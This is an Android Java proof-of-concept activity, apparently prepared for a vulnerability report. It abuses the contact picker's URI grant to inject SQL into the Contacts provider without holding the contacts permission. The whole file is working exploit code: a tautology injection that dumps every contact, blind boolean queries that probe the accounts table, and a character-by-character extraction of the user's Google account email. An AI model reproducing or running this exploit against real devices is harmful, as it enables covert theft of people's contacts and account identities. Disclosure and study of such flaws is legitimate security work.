package com.vrp.poc;

import android.app.Activity;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;

public class ContactPickerSqliActivity extends Activity {
    private static final String TAG = "ContactPickerSQLi";
    private static final int PICK_CONTACT = 1;
    private TextView logView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(10);
        logView.setText("Zero-Permission Contacts SQLi PoC\n");
        logView.append("UID: " + android.os.Process.myUid() + "\n");
        logView.append("This app has NO READ_CONTACTS — uses picker URI grant only\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);

        log("Launching contact picker...");
        Intent pickContact = new Intent(Intent.ACTION_PICK, ContactsContract.Contacts.CONTENT_URI);
        startActivityForResult(pickContact, PICK_CONTACT);
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == PICK_CONTACT && resultCode == RESULT_OK && data != null) {
            Uri contactUri = data.getData();
            log("Got contact URI: " + contactUri);
            new Thread(() -> runExploit(contactUri)).start();
        } else {
            log("Contact picker cancelled or failed");
        }
    }

    private void runExploit(Uri contactUri) {
        log("\n=== Phase 1: Normal query (should return 1 contact) ===");
        try {
            Cursor c = getContentResolver().query(contactUri, null, null, null, null);
            if (c != null) {
                log("Normal query: " + c.getCount() + " rows");
                c.close();
            }
        } catch (Exception e) {
            log("Normal query error: " + e.getMessage());
        }

        log("\n=== Phase 2: Tautology injection (all contacts via single grant) ===");
        try {
            Cursor c = getContentResolver().query(contactUri, null, "1=1 OR 1=1", null, null);
            if (c != null) {
                log("[TEST] Tautology returned " + c.getCount() + " contacts (should be 1 if protected)");
                c.close();
            }
        } catch (Exception e) {
            log("Tautology error: " + e.getMessage());
        }

        log("\n=== Phase 3: Blind boolean — count accounts ===");
        for (int n = 0; n <= 10; n++) {
            try {
                Cursor c = getContentResolver().query(contactUri, null,
                    "1=1 AND (SELECT count(*) FROM accounts) = " + n, null, null);
                if (c != null) {
                    if (c.getCount() > 0) {
                        log("[VULN] accounts table has " + n + " rows (via picker URI!)");
                        c.close();
                        break;
                    }
                    c.close();
                }
            } catch (Exception e) {
                log("accounts count=" + n + ": " + e.getMessage());
                break;
            }
        }

        log("\n=== Phase 4: Extract Google account email ===");
        StringBuilder email = new StringBuilder();
        for (int pos = 1; pos <= 30; pos++) {
            int low = 32, high = 126;
            boolean found = false;
            while (low < high) {
                int mid = (low + high) / 2;
                try {
                    Cursor c = getContentResolver().query(contactUri, null,
                        "1=1 AND (SELECT unicode(substr(account_name," + pos + ",1)) FROM accounts LIMIT 1) > " + mid,
                        null, null);
                    if (c != null) {
                        if (c.getCount() > 0) low = mid + 1;
                        else high = mid;
                        c.close();
                        found = true;
                    }
                } catch (Exception e) {
                    break;
                }
            }
            if (!found || low == 32) break;
            email.append((char) low);
            log("  email[" + pos + "] = '" + (char) low + "'");
        }
        log("[VULN] Extracted email: " + email.toString());

        log("\n=== Phase 5: Count total internal tables ===");
        for (int n = 20; n <= 50; n++) {
            try {
                Cursor c = getContentResolver().query(contactUri, null,
                    "1=1 AND (SELECT count(*) FROM sqlite_master WHERE type='table') = " + n,
                    null, null);
                if (c != null) {
                    if (c.getCount() > 0) {
                        log("[VULN] Total internal tables: " + n + " (via picker URI!)");
                        c.close();
                        break;
                    }
                    c.close();
                }
            } catch (Exception e) {
                break;
            }
        }

        log("\n=== Zero-permission extraction complete ===");
    }
}
